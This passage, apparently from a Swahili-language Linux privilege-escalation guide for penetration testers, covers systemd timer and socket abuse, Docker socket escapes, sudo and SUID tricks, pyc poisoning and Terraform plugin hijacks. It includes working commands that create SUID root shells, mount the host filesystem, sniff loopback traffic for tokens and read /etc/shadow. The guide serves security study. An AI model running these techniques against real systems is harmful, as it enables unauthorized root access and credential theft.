### Timers Zinazoweza Kuandikwa

Ikiwa unaweza kurekebisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika documentation unaweza kusoma Unit ni nini:

> Unit itakayowashwa timer hii itakapomalizika. Hoja hii ni jina la unit, ambalo kiambishi chake si ".timer". Ikiwa halijaainishwa, thamani hii kwa chaguo-msingi huwa service yenye jina sawa na unit ya timer, isipokuwa kiambishi. (Tazama hapo juu.) Inapendekezwa kwamba jina la unit linalowashwa na jina la unit ya timer liwe sawa, isipokuwa kiambishi.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Kupata systemd unit fulani (kama `.service`) ambayo **inatekeleza binary inayoweza kuandikwa**
- Kupata systemd unit fulani ambayo **inatekeleza relative path** na una **privileges za kuandika** kwenye **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwasha Timer**

Ili kuwasha timer unahitaji privileges za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** huwashwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **process communication** kwenye mashine moja au tofauti ndani ya miundo ya client-server. Hutumia descriptor files za kawaida za Unix kwa mawasiliano kati ya kompyuta na huwekwa kupitia files za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia files za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya file hili, parameters kadhaa za kuvutia zinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti, lakini muhtasari hutumika **kuonyesha itasikiliza wapi** kwenye socket (path ya file ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Hupokea boolean argument. Ikiwa ni **true**, **service instance huanzishwa kwa kila incoming connection** na connection socket pekee ndiyo hupitishwa kwake. Ikiwa ni **false**, listening sockets zote zenyewe **hupitishwa kwa service unit iliyoanzishwa**, na service unit moja pekee huanzishwa kwa connections zote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia traffic yote inayoingia bila masharti. **Default ni false**. Kwa sababu za performance, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Hupokea command lines moja au zaidi, ambazo **hutekelezwa kabla** au **baada** ya listening **sockets**/FIFOs **kuundwa** na kuunganishwa, mtawalia. Token ya kwanza ya command line lazima iwe absolute filename, ikifuatiwa na arguments za process.
- `ExecStopPre`, `ExecStopPost`: **Commands** za ziada ambazo **hutekelezwa kabla** au **baada** ya listening **sockets**/FIFOs **kufungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la **service** unit **itakayoamilishwa** kwenye **incoming traffic**. Setting hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa default, hutumia service yenye jina sawa na socket (suffix ikiwa imebadilishwa). Katika hali nyingi, haipaswi kuwa muhimu kutumia option hii.

### Writable .socket files

Ukikuta file ya `.socket` iliyo **writable**, unaweza **kuongeza** mwanzoni mwa section ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor`, na backdoor itatekelezwa kabla ya socket kuundwa. Kwa hiyo, **huenda ukahitaji kusubiri hadi mashine iwashwe upya.**\
_Note kwamba system lazima iwe inatumia configuration ya socket file hiyo, la sivyo backdoor haitatekelezwa_

### Socket activation + writable unit path (create missing service)

Misconfiguration nyingine yenye athari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit inayorejelewa haipo
- attacker anaweza kuandika kwenye `/etc/systemd/system` (au unit search path nyingine)

Katika hali hiyo, attacker anaweza kuunda `<name>.service`, kisha kutuma traffic kwenye socket ili systemd ipakie na itekeleze service mpya kama root.

Mtiririko wa haraka:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets zinazoweza kuandikwa

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_hapa tunazungumzia Unix Sockets, si faili za usanidi za `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na huenda ukatumia vulnerability.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets zinazosikiliza** maombi ya HTTP (_sizungumzii faili za .socket, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ikiwa socket **itajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na pengine **kutumia vulnerability fulani**.

### Docker Socket Inayoweza Kuandikwa

Docker socket, ambayo mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayopaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na user `root` na wanachama wa group `docker`. Kuwa na write access kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna maelezo ya jinsi hii inavyoweza kufanywa, pamoja na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation kwa kutumia Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza kufanya privilege escalation kwa kutumia commands zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi hukuruhusu kuendesha container yenye ufikiaji wa kiwango cha root kwenye file system ya host.

#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, Docker socket bado inaweza kutumiwa vibaya kwa kutumia raw HTTP kupitia Unix socket. Mtiririko unaotegemeka zaidi ni:

- create container ya helper ya muda mrefu huku host root ikiwa imewekwa kama bind mount
- ianzishe
- create instance ya `exec` ndani ya helper hiyo
- ianzishe instance ya `exec` na usome output kupitia API

**Orodhesha Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Unda na uanzishe container msaidizi**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Unda instance ya exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Anzisha instance ya exec na usome matokeo**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Muundo huu kwa kawaida ni imara zaidi kuliko kujaribu kuendesha `attach` kwa mikono ukitumia `socat` au `nc -U`. Mara tu unapoweza kuunda helper yenye `/:/host`, unaweza kutumia instances za ziada za `exec` kusoma files kama `/host/root/...`, kuongeza SSH keys chini ya `/host/root/.ssh`, au kurekebisha host startup files.

### Nyingine

Kumbuka kwamba ikiwa una write permissions kwenye docker socket kwa sababu uko **ndani ya group `docker`**, una [**njia zaidi za kufanya privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port**], unaweza pia kui-compromise](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka kwenye containers au kutumia vibaya container runtimes kufanya privilege escalation** katika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ukipata kwamba unaweza kutumia command ya **`ctr`**, soma ukurasa ufuatao kwa sababu **unaweza kuweza kuitumia vibaya kufanya privilege escalation**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ukipata kwamba unaweza kutumia command ya **`runc`**, soma ukurasa ufuatao kwa sababu **unaweza kuweza kuitumia vibaya kufanya privilege escalation**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa **Inter-Process Communication (IPC)** unaowezesha applications kuwasiliana na kushirikiana data kwa ufanisi. Ukiundwa kwa kuzingatia Linux system za kisasa, unatoa framework thabiti kwa aina mbalimbali za mawasiliano ya applications.

Mfumo huu una matumizi mbalimbali, ukiunga mkono IPC ya msingi inayoboresha ubadilishanaji wa data kati ya processes, sawa na **enhanced UNIX domain sockets**. Pia husaidia kusambaza events au signals, na kuwezesha integration isiyo na matatizo kati ya system components. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu incoming call inaweza kuufanya music player iweke mute, hivyo kuboresha user experience. Zaidi ya hayo, D-Bus inasaidia remote object system, ikirahisisha service requests na method invocations kati ya applications, na kurahisisha processes ambazo hapo awali zilikuwa changamano.

D-Bus hufanya kazi kwa kutumia **allow/deny model**, ikidhibiti message permissions (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya policy rules zinazolingana. Policies hizi hubainisha interactions na bus, na zinaweza kuruhusu privilege escalation kupitia exploitation ya permissions hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukieleza permissions za root user kumiliki, kutuma messages kwa, na kupokea messages kutoka kwa `fi.w1.wpa_supplicant1`.

Policies ambazo hazijaainisha user au group hutumika kwa wote, huku policies za "default" context zikitumika kwa policies zote ambazo hazijashughulikiwa na policies nyingine maalum.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kufanya enumeration na kutumia exploit dhidi ya mawasiliano ya D-Bus hapa:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima inafurahisha kufanya enumeration ya mtandao na kubaini mahali mashine ilipo.

### Enumeration ya jumla
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Tathmini ya haraka ya outbound filtering

Ikiwa host inaweza kuendesha commands lakini callbacks zinashindikana, bainisha kwa haraka uchujaji wa DNS, transport, proxy, na route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Daima kagua network services zinazoendesha kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners kwa target ya bind:

- `0.0.0.0` / `[::]`: zimewekwa wazi kwenye interfaces zote za ndani.
- `127.0.0.1` / `::1`: za ndani tu (zinafaa kwa tunnel/forward).
- IP maalum za ndani (k.m. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinafikiwa kutoka segments za ndani pekee.

### Workflow ya triage ya service za ndani tu

Unapocompromise host, services zilizofungwa kwenye `127.0.0.1` mara nyingi zinaanza kufikika kwa mara ya kwanza kutoka kwenye shell yako. Workflow ya haraka ya ndani ni:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama network scanner (network-only mode)

Mbali na ukaguzi wa ndani wa PE, linPEAS inaweza kufanya kazi kama network scanner inayolenga zaidi. Inatumia binaries zinazopatikana kwenye `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ukipitisha `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama pure network scanner (ikikwepa ukaguzi mwingine wa privilege-escalation).

### Sniffing

Angalia kama unaweza kufanya sniff traffic. Ukiweza, huenda ukaweza kupata credentials.
```
timeout 1 tcpdump
```
Ukaguzi wa haraka wa kivitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ni muhimu sana katika post-exploitation kwa sababu services nyingi za ndani pekee huweka wazi tokens/cookies/credentials huko:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Nasa sasa, chambua baadaye:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Generic Enumeration

Angalia wewe ni **nani**, una **privileges** zipi, ni **watumiaji** gani wapo kwenye mifumo, ni upi kati yao unaweza kufanya **login**, na ni upi wenye **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Baadhi ya matoleo ya Linux yaliathiriwa na bug inayowaruhusu users wenye **UID > INT_MAX** kufanya privilege escalation. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

Angalia ikiwa wewe ni **member wa group fulani** inayoweza kukupa root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia ikiwa kuna kitu chochote cha kuvutia ndani ya clipboard (ikiwezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nenosiri
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Ikiwa **unajua password yoyote** ya mazingira, **jaribu ku-login kama kila user** ukitumia password hiyo.

### Su Brute

Ikiwa hujali kusababisha noise nyingi na binaries za `su` na `timeout` zinapatikana kwenye computer, unaweza kujaribu kufanya brute-force ya user ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameter ya `-a` pia hujaribu kufanya brute-force ya users.

## Writable PATH abuses

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folder fulani ya $PATH**, unaweza kuwa na uwezo wa ku-escalate privileges kwa **kuunda backdoor ndani ya writable folder** yenye jina la command fulani ambayo itatekelezwa na user mwingine (root ikiwezekana), na ambayo **haipakiwa kutoka kwenye folder iliyoko kabla** ya writable folder yako ndani ya $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza command fulani ukitumia sudo, au command hiyo inaweza kuwa na SUID bit. Iangalie ukitumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa privileges za mtumiaji mwingine bila kujua password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu, mtumiaji `demo` anaweza kuendesha `vim` kama `root`; sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye directory ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Directive hii humruhusu mtumiaji **kuweka environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **uliotegemea mashine ya HTB Admirer**, ulikuwa **vulnerable** kwa **PYTHONPATH hijacking** ili kupakia python library ya kiholela wakati wa kutekeleza script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Ikiwa **sudo-allowed Python script** ina-import module ambayo package directory yake ina **`__pycache__` inayoweza kuandikwa**, unaweza kubadilisha `.pyc` iliyohifadhiwa na kupata code execution kama mtumiaji mwenye privileged kwenye import inayofuata.

- Kwa nini inafanya kazi:
- CPython huhifadhi bytecode caches katika `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter huthibitisha **header** (magic + timestamp/hash metadata inayohusishwa na source), kisha hutekeleza marshaled code object iliyohifadhiwa baada ya header hiyo.
- Ikiwa unaweza **kufuta na kuunda upya** cached file kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyoweza kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
- `sudo -l` inaonyesha Python script au wrapper unayoweza kuendesha kama root.
- Script hiyo ina-import local module kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
- Directory ya `__pycache__` ya imported module inaweza kuandikwa na user wako au na kila mtu.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ikiwa unaweza kukagua script yenye privileges, tambua modules zilizoingizwa na cache path yao:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Mtiririko wa matumizi mabaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma baiti 16 za kwanza kutoka kwenye faili halali ya `.pyc` na uzitumie tena kwenye faili iliyo poisoned.
3. Compile code object ya payload, ifanye `marshal.dumps(...)`, futa faili ya awali ya cache, kisha iunde tena kwa header ya awali pamoja na bytecode yako hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import itekeleze payload yako kama root.

Vidokezo muhimu:

- Kutumia tena header ya awali ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya source file, si kama mwili wa bytecode unaendana kweli na source.
- Hii ni muhimu hasa wakati source file inamilikiwa na root na haiwezi kuandikwa, lakini directory iliyo na `__pycache__` inaweza kuandikwa.
- Attack itashindwa ikiwa privileged process inatumia `PYTHONDONTWRITEBYTECODE=1`, ina-import kutoka location yenye permissions salama, au inaondoa write access kwenye kila directory iliyo kwenye import path.

Muundo wa chini kabisa wa proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Hakikisha hakuna directory katika privileged Python import path inayoweza kuandikwa na low-privileged users, ikijumuisha `__pycache__`.
- Kwa privileged runs, zingatia `PYTHONDONTWRITEBYTECODE=1` na ukaguzi wa mara kwa mara wa `__pycache__` directories zinazoweza kuandikwa bila kutarajiwa.
- Chukulia writable local Python modules na writable cache directories kwa njia ileile unayochukulia writable shell scripts au shared libraries zinazoendeshwa na root.

### BASH_ENV preserved via sudo env_keep → root shell

Ikiwa sudoers itahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia non-interactive startup behavior ya Bash kuendesha arbitrary code kama root unapotekeleza command iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa non-interactive shells, Bash hutathmini `$BASH_ENV` na kusource file hiyo kabla ya kuendesha target script. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, file yako husource-ishwa ikiwa na root privileges.

- Mahitaji:
- Sudo rule unayoweza kuendesha (target yoyote inayoita `/bin/bash` non-interactively, au bash script yoyote).
- `BASH_ENV` ipo kwenye `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa commands zinazoruhusiwa na sudo; tumia binaries ndogo.
- Zingatia sudo I/O logging na alerting wakati env vars zilizohifadhiwa zinatumika.

### Terraform kupitia sudo ikiwa HOME imehifadhiwa (!env_reset)

Ikiwa sudo itaacha environment bila kubadilika (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` inabaki kuwa ya user anayeita command. Kwa hiyo Terraform hupakia **$HOME/.terraformrc** kama root na kuheshimu `provider_installation.dev_overrides`.

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na uweke plugin hasidi yenye jina la provider (kwa mfano, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kufanya Go plugin handshake lakini itatekeleza payload kama root kabla ya kuanguka, na kuacha SUID shell.

### TF_VAR overrides + symlink validation bypass

Terraform variables zinaweza kutolewa kupitia environment variables za `TF_VAR_<name>`, ambazo hubaki wakati sudo inapohifadhi environment. Weak validations kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` zinaweza kupitwa kwa kutumia symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi kwenye eneo linaloweza kusomwa na attacker. Mbinu hiyo hiyo inaweza kutumika **kuandika** kwenye paths zenye privileges kwa kuunda mapema symlink za destination (kwa mfano, kuelekeza destination path ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo iendeshwe kutoka kwenye TTY shirikishi pekee. Ikiwa `!requiretty` imewekwa (au option hiyo haipo), sudo inaweza kutekelezwa kutoka kwenye contexts zisizo shirikishi kama vile reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
Hii si vulnerability ya moja kwa moja yenyewe, lakini inapanua hali ambazo sudo rules zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye entries zinazoandikika na attacker (kwa mfano, `/home/<user>/bin`), command yoyote ya relative ndani ya target iliyoruhusiwa na sudo inaweza kufichwa na nyingine.

- Mahitaji: sudo rule (mara nyingi `NOPASSWD`) inayoendesha script/binary inayokiita commands bila absolute paths (`free`, `df`, `ps`, n.k.) na PATH entry inayoweza kuandikwa ambayo hutafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Ruka** ili kusoma faili zingine au kutumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Ikiwa **ruhusa ya sudo** imetolewa kwa command moja **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha variable ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza command nyingine bila kubainisha path yake (kila mara angalia kwa kutumia** _**strings**_ **maudhui ya binary ya ajabu ya SUID)**.

